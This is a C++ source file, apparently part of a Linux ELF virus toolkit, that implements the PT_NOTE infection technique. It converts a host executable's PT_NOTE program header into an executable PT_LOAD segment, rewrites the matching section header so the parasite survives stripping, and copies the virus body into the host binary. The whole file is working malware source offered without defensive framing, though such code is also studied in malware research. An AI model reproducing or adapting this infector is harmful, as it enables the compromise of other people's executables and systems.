#include "infector/pt_note_infector.hh"
#include <elf.h>
#include <algorithm>
#include "common/file_descriptor.hh"
#include "common/macros.hh"
#include "common/math.hh"
#include "nostdlib/string.hh"
#include "nostdlib/unistd.hh"

namespace vf::infector {

namespace {
bool patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr, uint64_t virus_size,
               uint64_t virus_offset, Elf64_Off original_pt_note_file_offset,
               Elf64_Addr parasite_load_address) {
  auto sht_entry_count = ehdr.e_shnum;
  auto* section_entry = &shdr;

  for (size_t i = 0; i < sht_entry_count; ++i) {
    if (section_entry->sh_offset == original_pt_note_file_offset) {
      section_entry->sh_offset = virus_offset;
      section_entry->sh_size = virus_size;
      section_entry->sh_addr = parasite_load_address;
      section_entry->sh_type = SHT_PROGBITS;
      section_entry->sh_flags = SHF_EXECINSTR | SHF_ALLOC;
      section_entry->sh_addralign = 64;
      return true;
    }
    // Move to the next section entry
    ++section_entry;
  }
  // Failed to find the section header entry.
  return false;
}

void patch_phdr(Elf64_Phdr& phdr, uint64_t virus_size, uint64_t virus_offset,
                size_t pt_note_to_be_infected_idx,
                Elf64_Xword pt_load_alignment,
                Elf64_Addr parasite_load_address) {
  auto* pt_note_to_be_infected = &phdr + pt_note_to_be_infected_idx;
  // transforming pt_note to pt_load
  pt_note_to_be_infected->p_align = pt_load_alignment;
  pt_note_to_be_infected->p_vaddr = parasite_load_address;
  pt_note_to_be_infected->p_paddr = parasite_load_address;
  pt_note_to_be_infected->p_filesz = virus_size;
  pt_note_to_be_infected->p_memsz = virus_size;
  pt_note_to_be_infected->p_offset = virus_offset;
  pt_note_to_be_infected->p_type = PT_LOAD;
  pt_note_to_be_infected->p_flags = PF_R | PF_X;
}

}  // namespace

bool PtNoteInfector::analyze(std::span<const std::byte> host_mapping,
                             std::span<const std::byte> parasite_mapping) {
  host_size_ = host_mapping.size();
  parasite_size_ = parasite_mapping.size();
  const auto& ehdr = reinterpret_cast<const Elf64_Ehdr&>(host_mapping.front());
  if ((ehdr.e_type != ET_EXEC && ehdr.e_type != ET_DYN) ||
      ehdr.e_ident[EI_CLASS] != ELFCLASS64) {
    return false;
  }

  const auto& phdr =
      reinterpret_cast<const Elf64_Phdr&>(host_mapping[ehdr.e_phoff]);

  original_e_entry_ = ehdr.e_entry;

  // Find code segment
  const Elf64_Phdr* phdr_entry = &phdr;
  for (size_t i = 0; i < ehdr.e_phnum; ++i, ++phdr_entry) {
    if (phdr_entry->p_type == PT_LOAD) {
      // the parasite should have a loading address avoiding all other LOAD
      // segments.
      auto last_byte_of_segment = phdr_entry->p_vaddr + phdr_entry->p_memsz - 1;
      auto potential_virus_loading_addr = last_byte_of_segment + 1;
      parasite_load_address_ =
          std::max(parasite_load_address_,
                   common::round_up_to(potential_virus_loading_addr,
                                       phdr_entry->p_align));
      // copy alignment so later we can assign to PT_NOTE.
      pt_load_alignment_ = phdr_entry->p_align;
      virus_offset_ =
          common::round_up_to(host_mapping.size(), pt_load_alignment_);
    } else if (phdr_entry->p_type == PT_NOTE) {
      // We found the last PT_NOTE section that can be infected, because
      // GNU_PROPERTY (for example on x86-64) might overlap with the first. On
      // aarch64, it doesn't have such problem.
      pt_note_to_be_infected_idx_ = i;
      original_pt_note_file_offset_ = phdr_entry->p_offset;
    }
    // Do not early break out because we must scan all LOAD segments to find the
    // highest vaddress.
  }

  // There is no pt_note. Give up.
  if (pt_note_to_be_infected_idx_ == 0) {
    auto s = STR_LITERAL("no pt note to be infected\n");
    vf::write(1, s, vf::strlen(s));
    return false;
  }

  // Check if this is compiled from golang, which relies on the note section to
  // work. We cannot mutate it.
  auto sht_entry_count = ehdr.e_shnum;
  auto* shdr = reinterpret_cast<const Elf64_Shdr*>(&host_mapping[ehdr.e_shoff]);
  auto shstrtab_idx = ehdr.e_shstrndx;
  auto shstrtab = &host_mapping[(shdr + shstrtab_idx)->sh_offset];
  for (size_t i = 0; i < sht_entry_count; ++i) {
    auto cur_entry = shdr + i;
    if (cur_entry->sh_type == SHT_NOTE) {
      const auto* name =
          reinterpret_cast<const char*>(shstrtab + cur_entry->sh_name);
      if (name[6] == 'g' && name[7] == 'o') {
        auto s = STR_LITERAL("cannot infect elf compiled from golang\n");
        vf::write(1, s, vf::strlen(s));
        return false;
      }
    }
  }

  // if in the rare case that host is some weirdo, that actually has data at the
  // end of the file after section header table, do not infect because it's
  // likely there are other issues preventing it from working. For example, the
  // binary distributed by bazel does this https://github.com/bazelbuild/bazel
  if (parasite_load_address_ <=
      host_mapping.size() - ehdr.e_shnum * ehdr.e_shentsize) {
    auto s = STR_LITERAL("gave up because there are bytes appended\n");
    vf::write(1, s, vf::strlen(s));
    return false;
  }

  return true;
}

std::optional<InjectionResult> PtNoteInfector::inject(
    std::span<std::byte> host_mapping,
    std::span<const std::byte> parasite_mapping) {
  const auto& ehdr = reinterpret_cast<const Elf64_Ehdr&>(host_mapping.front());

  const auto virus_size = parasite_mapping.size();

  {
    auto& mutable_phdr =
        reinterpret_cast<Elf64_Phdr&>(host_mapping[ehdr.e_phoff]);
    patch_phdr(mutable_phdr, virus_size, virus_offset_,
               pt_note_to_be_infected_idx_, pt_load_alignment_,
               parasite_load_address_);
  }

  {
    // mutate a note section entry to cover our virus so it doesn't get
    // stripped.
    auto& mutable_shdr =
        reinterpret_cast<Elf64_Shdr&>(host_mapping[ehdr.e_shoff]);
    if (!patch_sht(ehdr, mutable_shdr, virus_size, virus_offset_,
                   original_pt_note_file_offset_, parasite_load_address_)) {
      return std::nullopt;
    }
  }

  // Inject the virus.
  vf::memcpy(&host_mapping[virus_offset_], &parasite_mapping.front(),
             parasite_mapping.size());

  return InjectionResult{
      .parasite_entry_address = parasite_load_address_,
      .parasite_file_offset = virus_offset_,
  };
}

size_t PtNoteInfector::injected_host_size() {
  // In order to make this work on PIEs, the virus file offset must equal to
  // vaddr. Therefore, the file size will be extended. Note that this is not
  // necessary for non-PIE but doing this makes both PIE and non-PIE handling
  // simple. The size effect is that the executable would be very big, if the
  // victim happens to use a custom linker script that points segments at a very
  // large starting vaddr.
  return virus_offset_ + parasite_size_;
}

}  // namespace vf::infector